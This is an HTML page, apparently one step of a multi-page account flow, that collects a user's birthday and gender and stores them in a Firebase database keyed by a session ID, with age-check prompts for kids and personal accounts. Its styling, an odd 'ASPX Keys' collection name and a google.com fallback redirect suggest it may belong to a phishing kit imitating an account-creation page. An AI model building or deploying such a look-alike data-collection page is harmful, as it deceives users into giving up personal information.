<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmfff your info</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-color: #ffffff;
            --text-primary: #000000;
            --text-secondary: #555555;
            --input-border: #c4c4c4;
            --input-focus: #000000;
            --input-bg: #ffffff;
            --btn-bg: #000000;
            --btn-text: #ffffff;
            --btn-hover: #333333;
            --btn-alt-bg: #f1f3f4;
            --btn-alt-text: #000000;
            --btn-alt-hover: #e8eaed;
            --error-text: #d93025;
            --modal-overlay: rgba(0, 0, 0, 0.5);
            --modal-bg: #ffffff;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #121212;
                --text-primary: #ffffff;
                --text-secondary: #aaaaaa;
                --input-border: #555555;
                --input-focus: #ffffff;
                --input-bg: #1e1e1e;
                --btn-bg: #ffffff;
                --btn-text: #000000;
                --btn-hover: #e0e0e0;
                --btn-alt-bg: #333333;
                --btn-alt-text: #ffffff;
                --btn-alt-hover: #444444;
                --error-text: #ff6b6b;
                --modal-overlay: rgba(0, 0, 0, 0.7);
                --modal-bg: #1e1e1e;
            }
        }

        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        
        body { 
            background-color: var(--bg-color); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: var(--text-primary);
            transition: background-color 0.3s, color 0.3s;
        }

        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
        
        h1 { font-size: 32px; font-weight: 600; margin-bottom: 15px; color: var(--text-primary); }
        p { color: var(--text-secondary); font-size: 15px; margin-bottom: 35px; line-height: 1.4; }
        
        .input-group { position: relative; margin-bottom: 22px; text-align: left; }
        
        .label { 
            position: absolute; 
            top: -10px; 
            left: 20px; 
            background: var(--bg-color); 
            padding: 0 5px; 
            font-size: 12px; 
            color: var(--text-secondary); 
            z-index: 1; 
        }
        
        .dob-flex { display: flex; gap: 12px; }
        
        .input-field { 
            width: 100%; 
            padding: 14px 20px; 
            border: 1px solid var(--input-border); 
            border-radius: 50px; 
            font-size: 16px; 
            outline: none; 
            background-color: var(--input-bg);
            color: var(--text-primary);
            transition: border 0.2s; 
        }
        
        .input-field:focus { border-color: var(--input-focus); border-width: 1.5px; }

        select.input-field {
            appearance: none; -webkit-appearance: none; -moz-appearance: none; cursor: pointer;
        }

        .btn-continue, .btn-alt { 
            width: 100%; 
            padding: 15px; 
            border: none; 
            border-radius: 50px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 15px; 
            transition: background-color 0.2s;
        }
        
        .btn-continue { background-color: var(--btn-bg); color: var(--btn-text); }
        .btn-continue:hover { background-color: var(--btn-hover); }
        
        .btn-alt { background-color: var(--btn-alt-bg); color: var(--btn-alt-text); margin-top: 10px; }
        .btn-alt:hover { background-color: var(--btn-alt-hover); }

        .error-text { color: var(--error-text); font-size: 13px; margin-top: 5px; display: none; text-align: left; padding-left: 20px; }

        /* Modal Styles */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--modal-overlay);
            display: flex; justify-content: center; align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: var(--modal-bg); padding: 30px; border-radius: 20px;
            width: 90%; max-width: 350px; text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .modal-content p { color: var(--text-primary); font-size: 16px; margin-bottom: 25px; font-weight: 500; }
    </style>
</head>
<body>

<div class="container">
    <h1 id="main-heading">Let's confirm your age</h1>
    <p id="sub-text">Enter Your birthday & Gender</p>

    <div class="dob-flex">
        <div class="input-group" style="flex: 1;">
            <span class="label">Day</span>
            <input type="number" id="day" class="input-field" placeholder="DD" oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2);">
        </div>
        
        <div class="input-group" style="flex: 2;">
            <span class="label">Month</span>
            <select id="month" class="input-field">
                <option value="01">January</option>
                <option value="02">February</option>
                <option value="03">March</option>
                <option value="04">April</option>
                <option value="05">May</option>
                <option value="06">June</option>
                <option value="07">July</option>
                <option value="08">August</option>
                <option value="09">September</option>
                <option value="10">October</option>
                <option value="11">November</option>
                <option value="12">December</option>
            </select>
        </div>

        <div class="input-group" style="flex: 1.5;">
            <span class="label">Year</span>
            <input type="number" id="year" class="input-field" placeholder="YYYY" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
        </div>
    </div>

    <div class="input-group">
        <span class="label">Gender</span>
        <select id="gender" class="input-field">
            <option value="" disabled selected>Select Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
            <option value="Rather Not To Say">Rather Not To Say</option>
        </select>
    </div>

    <div id="error" class="error-text">Please enter a valid date and gender.</div>
    <button id="nextBtn" class="btn-continue">Continue</button>
</div>

<div id="ageModal" class="modal-overlay" style="display: none;">
    <div class="modal-content">
        <p id="modal-text"></p>
        <button id="modal-primary-btn" class="btn-continue"></button>
        <button id="modal-secondary-btn" class="btn-alt"></button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    // Added deleteDoc to handle the cancel deletion
    import { getFirestore, doc, getDoc, updateDoc, deleteDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
        authDomain: "question-metabase.firebaseapp.com",
        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "question-metabase",
        storageBucket: "question-metabase.firebasestorage.app",
        messagingSenderId: "770698198753",
        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');

    let userData = {}; // Store fetched DB data globally for logic

    if (sessionId) {
        getDoc(doc(db, "ASPX Keys", sessionId)).then((docSnap) => {
            if (docSnap.exists()) {
                userData = docSnap.data();
                const heading = document.getElementById("main-heading");
                const subText = document.getElementById("sub-text");

                if (userData.type === "personal" || userData.type === "business" || userData.type === "kids") {
                    heading.innerText = "Let’s Confirm Some of Your Basic Information";
                }

                if (userData.type === "kids") {
                    subText.innerText = `Enter ${userData.firstName || 'your'}'s birthday and gender`;
                } else {
                    subText.innerText = "Enter Your birthday & Gender";
                }
            }
        });
    }

    // --- Validation Functions ---
    function isValidDate(day, month, year) {
        const d = parseInt(day, 10);
        const m = parseInt(month, 10);
        const y = parseInt(year, 10);
        
        if (y < 1900 || y > new Date().getFullYear()) return false;
        
        const date = new Date(y, m - 1, d);
        return date.getFullYear() === y && date.getMonth() + 1 === m && date.getDate() === d;
    }

    function calculateAge(day, month, year) {
        const dob = new Date(year, month - 1, day);
        const today = new Date();
        let age = today.getFullYear() - dob.getFullYear();
        const mDiff = today.getMonth() - dob.getMonth();
        if (mDiff < 0 || (mDiff === 0 && today.getDate() < dob.getDate())) {
            age--;
        }
        return age;
    }

    // --- Form Submission Logic ---
    document.getElementById('nextBtn').addEventListener('click', async () => {
        const day = document.getElementById('day').value;
        const month = document.getElementById('month').value;
        const year = document.getElementById('year').value;
        const gender = document.getElementById('gender').value;
        const errorDiv = document.getElementById('error');

        // Check if date is structurally valid (leap year, 31 days check, etc.)
        if (!gender || !isValidDate(day, month, year)) {
            errorDiv.style.display = 'block';
            return;
        }
        errorDiv.style.display = 'none';

        const age = calculateAge(day, month, year);
        const docRef = doc(db, "ASPX Keys", sessionId);
        const formattedDob = `${day}/${month}/${year}`;
        const name = userData.firstName || "the user";

        // Logic 1: Kids account, but age > 15
        if (userData.type === "kids" && age >= 15) {
            showModal(
                `We have noticed that the date of birth of ${name} is 15+, would you want to switch to a Personal Account?`,
                "Continue with Kids Account",
                "Switch to Personal Account",
                async () => {
                    // Option A: Continue
                    await updateDoc(docRef, { dob: formattedDob, gender, updatedAt: serverTimestamp() });
                    window.location.href = `3.html?session=${sessionId}`;
                },
                async () => {
                    // Option B: Switch
                    await updateDoc(docRef, { type: "personal", family: "no", dob: formattedDob, gender, updatedAt: serverTimestamp() });
                    window.location.href = `3.html?session=${sessionId}`;
                }
            );
            return;
        }

        // Logic 2: Personal account, but age < 15
        if (userData.type === "personal" && age < 15) {
            showModal(
                `We have noticed that the date of birth of ${name} indicates an age under 15, would you want to switch to a Kids Account?`,
                "Switch to Kids Account",
                "Cancel",
                async () => {
                    // Option A: Switch
                    await updateDoc(docRef, { type: "kids", family: "commit database", dob: formattedDob, gender, updatedAt: serverTimestamp() });
                    window.location.href = `3.html?session=${sessionId}`;
                },
                async () => {
                    // Option B: Cancel & Delete
                    await deleteDoc(docRef);
                    window.location.href = userData.continue || "https://google.com";
                }
            );
            return;
        }

        // Default behavior (No age conflicts)
        try {
            await updateDoc(docRef, { dob: formattedDob, gender: gender, updatedAt: serverTimestamp() });
            window.location.href = `3.html?session=${sessionId}`;
        } catch (e) {
            alert("Session expired or invalid document ID.");
        }
    });

    // --- Modal Controller ---
    function showModal(text, btn1Text, btn2Text, onBtn1Click, onBtn2Click) {
        const modal = document.getElementById('ageModal');
        document.getElementById('modal-text').innerText = text;
        
        const btn1 = document.getElementById('modal-primary-btn');
        const btn2 = document.getElementById('modal-secondary-btn');
        
        btn1.innerText = btn1Text;
        btn2.innerText = btn2Text;

        // Clear previous event listeners by cloning
        btn1.replaceWith(btn1.cloneNode(true));
        btn2.replaceWith(btn2.cloneNode(true));

        document.getElementById('modal-primary-btn').addEventListener('click', onBtn1Click);
        document.getElementById('modal-secondary-btn').addEventListener('click', onBtn2Click);

        modal.style.display = 'flex';
    }
</script>

</body>
</html>
